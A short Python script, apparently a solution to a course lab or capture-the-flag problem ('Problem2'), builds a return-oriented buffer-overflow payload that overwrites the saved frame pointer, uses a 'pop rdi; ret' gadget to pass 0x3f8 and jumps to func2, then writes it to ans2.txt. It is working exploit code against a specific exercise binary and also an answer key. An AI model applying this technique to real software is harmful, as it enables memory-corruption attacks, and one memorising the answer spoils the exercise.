import struct

def p64(x):
    return struct.pack('<Q', x)

payload = b'A' * 8                    # 填充缓冲区
payload += b'B' * 8                   # 覆盖保存rbp
payload += p64(0x4012c7)             # pop rdi; ret
payload += p64(0x3f8)                # 参数
payload += p64(0x40124c)             # func2地址
payload += b'C' * (56 - len(payload)) # 填充至56字节

with open("ans2.txt", "wb") as f:
    f.write(payload)
print("Payload for Problem2 written to ans2.txt")